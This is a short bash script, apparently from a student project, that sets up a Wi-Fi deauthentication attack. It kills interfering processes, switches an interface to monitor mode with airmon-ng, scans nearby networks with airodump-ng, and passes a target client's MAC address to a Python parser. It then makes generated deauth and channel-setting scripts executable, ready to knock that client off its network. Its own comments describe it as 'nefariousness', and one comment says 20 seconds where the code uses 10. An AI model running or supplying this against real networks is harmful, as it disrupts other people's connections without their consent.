#!/bin/bash

IFACE=$1
CLIENT=$2

# kill processes that might interfere
# with our nefariousness
airmon-ng check kill

# put the device in monitor mode
airmon-ng start $IFACE

# run airodump for 20 seconds, dump output to csv
timeout 10 airodump-ng mon0  --write out --output-format csv

echo "Done with capturing surrounding network info, parsing...\n"
# run the python script to parse our csv output
# sorry mickens I didn't actually learn bash scripting
# prepends an -01 to the csv so we call our python script on that
python parser.py --mac $CLIENT --src out-01.csv --iface $IFACE

echo "Done parsing\n"
# change permissions on the files (hopefully) written by python
# script, need to do error checking
chmod +x deauth.sh
chmod +x set_channel.sh

# set the channel, prepared to call deauth whenever
./set_channel.sh


